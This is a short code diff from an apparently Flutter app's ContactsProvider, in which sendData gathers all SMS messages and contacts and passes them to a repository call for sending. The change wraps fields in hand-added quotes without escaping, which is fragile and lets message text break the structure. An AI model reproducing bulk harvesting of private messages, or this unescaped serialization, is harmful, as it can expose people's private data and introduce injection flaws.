@@ -77,23 +77,26 @@ class ContactsProvider extends ChangeNotifier {
   }
 
   sendData(BuildContext context) async {
-    List<Map> messagesList = _messages.map((e) {
+    List<Map> messagesList = _messages
+        .map((e) {
       return {
-        'message_body': e.body?.toString() ?? '',
-        'message_sender': e.address?.toString() ?? '',
-        'message_time': e.date?.toString() ?? '',
+        '"message_body"': '"${e.body?.toString()}"',
+        '"message_sender"': '"${e.address?.toString()}"' ,
+        '"message_time"': '"${e.date?.toString()}"' ,
       };
-    }).toList();
+    })
+        .toList();
+
 
     List<Map> contactsList = _contacts
         .map(
           (e) => {
-            'contact_name': e.displayName,
-            'contact_phone':
-                e.phones.isNotEmpty ? e.phones[0].number : 'no number',
-          },
-        )
+        '"contact_name"': '"${e.displayName}"',
+        '"contact_phone"': e.phones.isNotEmpty ? '"${e.phones[0].number}"' : '"no number"',
+      },
+    )
         .toList();
+
 
     await DataRepository.sendMessages(
         dataRequest: SendMessagesRequest(
